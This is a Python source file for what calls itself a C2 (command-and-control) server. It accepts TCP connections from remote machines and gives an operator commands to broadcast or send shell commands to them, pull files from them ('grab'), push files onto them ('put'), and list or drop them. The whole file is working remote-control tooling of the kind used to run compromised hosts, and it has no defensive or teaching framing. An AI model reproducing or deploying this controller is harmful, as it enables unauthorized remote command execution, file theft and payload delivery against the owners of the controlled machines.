#!/usr/bin/env python3
import socket 
import threading
import tqdm
import os
from C2utils import snd_msg, get_msg

r = open("../port", 'r')
port = int(r.readline())
r.close()
w = open("../port", 'w')
port = port + 1
w.write(str(port))
w.close()


## ========  Config  ========
HEADER = 64
PORT = port
#PORT = 5050
#SERVER = '10.96.10.191'
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "exit"
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

## ========  Globals  ========
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)
connected_machines = []

            
# Processes the user input
def handle_user():

    while True:
        cmd = input("> ") 
        cmd_lst = cmd.split()
        if len(cmd_lst) <= 0:
            continue

        ## Broadcast
        elif cmd_lst[0] == "broadcast":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 1:
                print("Usage: broadcast <cmd>")
                continue
            new_cmd = ' '.join(new_cmd)
            print(f'Sending \"{new_cmd}\" to...')
            itr = 1
            for data in connected_machines:
                print(f"{str(itr)}) {data['addr'][0]}")
                message = new_cmd.encode(FORMAT)
                length = str(len(message)).encode(FORMAT)
                length += b' ' * (HEADER - len(length))
                data['conn'].send(length)
                data['conn'].send(message)
                resp = get_msg(data['conn'])
                print(resp)
                print("=============================================")
                itr = itr + 1


        ## List
        elif cmd_lst[0] == "list":
            count = 1
            for data in connected_machines:
                print(f'{str(count)}) {data["addr"][0]}')
                count = count + 1
        ## Send
        elif cmd_lst[0] == "send":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 1:
                print("Usage: send <ip> <cmd>")
                continue
            sent = False
            for data in connected_machines:
                if data['addr'][0] == new_cmd[0]:
                    sent = True
                    new_cmd = ' '.join(new_cmd[1:])
                    print(f'Sending \"{new_cmd}\" to {data["addr"][0]}')
                    message = new_cmd.encode(FORMAT)
                    length = str(len(message)).encode(FORMAT)
                    length += b' ' * (HEADER - len(length))
                    data['conn'].send(length)
                    data['conn'].send(message)
                    resp = get_msg(data['conn'])
                    print(resp)

            if not sent:
                print(f'{new_cmd[0]} is not connected to the server.')
    
        ## grab
        elif cmd_lst[0] == "grab":
            for data in connected_machines:
                if data['addr'][0] == cmd_lst[2]:
                    snd_msg(data['conn'], "grab")
                    print(f"filename: {cmd_lst[1]}")
                    snd_msg(data['conn'], cmd_lst[1]) ## Sending ip the file name to grab
                    resp = get_msg(data['conn'])
                    
                    if resp != "SUCCESS":
                        print(resp)
                        continue

                    # receive the file infos
                    # receive using client socket, not server socket
                    received = get_msg(data['conn'])
                    filename, filesize = received.split(SEPARATOR)
                    print(f'filename: {filename}, fsize: {filesize}')
        
                    # convert to integer
                    filesize = int(filesize)

                    # start receiving the file from the socket
                    # and writing to the file stream
                    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                    bytes_left = filesize
                    with open(filename, "wb") as f:
                        while bytes_left > 0:
                            if bytes_left < BUFFER_SIZE:
                                bytes_to_write = bytes_left
                            else:
                                bytes_to_write = BUFFER_SIZE
                            # read 1024 bytes from the socket (receive)
                            bytes_read = data['conn'].recv(bytes_to_write)
                            #print(bytes_read)
                            bytes_left = bytes_left - bytes_to_write
                            #print(f'Bytes left {str(bytes_left)}')
                            # write to the file the bytes we just received
                            f.write(bytes_read)
                            # update the progress bar
                            progress.update(len(bytes_read))
                    progress.close()
                    f.close()
         

        ## put
        elif cmd_lst[0] == "put":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 2:
                print("Usage: put <filename> <ip>")
                continue
            sent = False
            filename = new_cmd[0]
            ip = new_cmd[1]
            try:
                filesize = os.path.getsize(filename)
            except:
                print(f"{filename} does not exist.")
                continue

            for data in connected_machines:
                if data['addr'][0] == ip:
                    snd_msg(data['conn'], "put")
                    sent = True
                    snd_msg(data['conn'], f"{filename}{SEPARATOR}{filesize}")
                    new_cmd = ' '.join(new_cmd[1:])
                    print(f'Uploading \"{filename}\" to {data["addr"][0]}')
                    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                    bytes_left = filesize 

                    with open(filename, 'rb') as f:
                        while bytes_left > 0:
                            # read the bytes from the file
                            if bytes_left > BUFFER_SIZE:
                                bytes_to_read = BUFFER_SIZE
                            else:
                                bytes_to_read = bytes_left
                            bytes_read = f.read(bytes_to_read)
                            bytes_left = bytes_left - bytes_to_read
                            # we use sendall to assure transimission in
                            # busy networks
                            data['conn'].sendall(bytes_read)
                            # update the progress bar
                            progress.update(len(bytes_read))
                    progress.close()
                    f.close()
            if not sent:
                print(f"{ip} not connected.")

        ## Close
        elif cmd_lst[0] == "close":
            for data in connected_machines:
                if data['addr'][0] == cmd_lst[1]:
                    snd_msg(data['conn'], "close")
                    data['conn'].close()
                    connected_machines.remove(data)

        ## help
        elif cmd_lst[0] == "help":
            print("1. broadcast <cmd here>")
            print("2. list")
            print("3. send <ip> <cmd here>")
            print("4. put <filename> <ip>")
            print("5. grab <filename> <ip>")
            print("6. close <ip>")
            print("7. help")

        ## Cmd not recognized
        else:
            print("Sorry, did not recognize that command.")
    

def start():
    server.listen()
    print(f"Server is listening on {SERVER}")
    t = threading.Thread(target=handle_user, args=())
    t.start()
    while True:
        conn, addr = server.accept()
        data = {
            'conn': conn,
            'addr': addr,
        }
        connected_machines.append(data)


start()
